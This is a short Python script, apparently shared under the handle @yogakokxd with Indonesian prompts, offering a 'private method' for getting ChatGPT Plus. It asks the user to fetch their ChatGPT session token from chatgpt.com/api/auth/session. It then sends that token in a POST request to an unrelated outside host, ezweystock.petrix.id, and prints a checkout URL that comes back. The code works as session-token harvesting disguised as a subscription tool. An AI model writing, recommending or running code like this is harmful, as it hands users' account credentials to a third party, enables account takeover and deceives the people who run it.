import requests
import getpass

url = "https://ezweystock.petrix.id/gpt/payment"

print(f"ChatGPT Method Private @yogakokxd\nToken bisa diambil di : https://chatgpt.com/api/auth/session")
session_token = getpass.getpass("Masukkan SESSION TOKEN: ")

payload = {
    "plan": "plus",
    "payment": "shortlink",
    "currency": "Indonesia",
    "session": session_token
}

headers = {
    "Content-Type": "application/json",
    "Origin": "https://ezweystock.petrix.id",
    "Referer": "https://ezweystock.petrix.id/gpt/"
}

response = requests.post(url, json=payload, headers=headers)

try:
    data = response.json()
    print("Status:", data.get("success"))
    print("Checkout URL:", data.get("url"))
except Exception:
    print("Response:", response.text)